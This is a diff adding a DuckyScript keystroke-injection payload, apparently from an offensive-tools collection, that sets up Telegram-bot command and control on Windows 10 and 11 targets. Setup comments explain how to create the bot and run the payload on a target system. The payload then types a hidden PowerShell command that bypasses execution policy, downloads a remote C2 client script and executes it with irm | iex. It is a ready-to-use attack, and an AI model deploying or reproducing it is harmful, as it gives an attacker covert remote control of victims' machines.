@@ -1,0 +1,27 @@
+
+REM Title: beigeworm's Telegram Command And Control.
+REM Author: @beigeworm
+REM Description: Using a Telegram Bot's Chat to Act as a Command and Control Platform.
+REM Target: Windows 10 and 11
+
+REM SETUP INSTRUCTIONS
+REM 1. visit https://t.me/botfather and make a bot.
+REM 2. add bot api to script.
+REM 3. search for bot in top left box in telegram and start a chat then type /start.
+REM 5. Run Script on target System
+REM 6. Check telegram chat for 'waiting to connect' message.
+REM 7. this script has a feature to wait until you start the session from telegram.
+REM 8. type in the computer name from that message into telegram bot chat to connect to that computer.
+REM 9. Replace TELEGRAM_BOT_API_TOKEN_HERE Below with your Telegram Bot API Token
+
+REM some setup for dukie script
+DEFAULT_DELAY 100
+
+REM open powershell (remove "-W H" to show the window)
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -NonI -NoP -Ep Bypass -W H -C $tg='TELEGRAM_BOT_API_TOKEN_HERE'; irm https://raw.githubusercontent.com/beigeworm/Powershell-Tools-and-Toys/main/Command-and-Control/Telegram-C2-Client.ps1 | iex
+ENTER
+
+
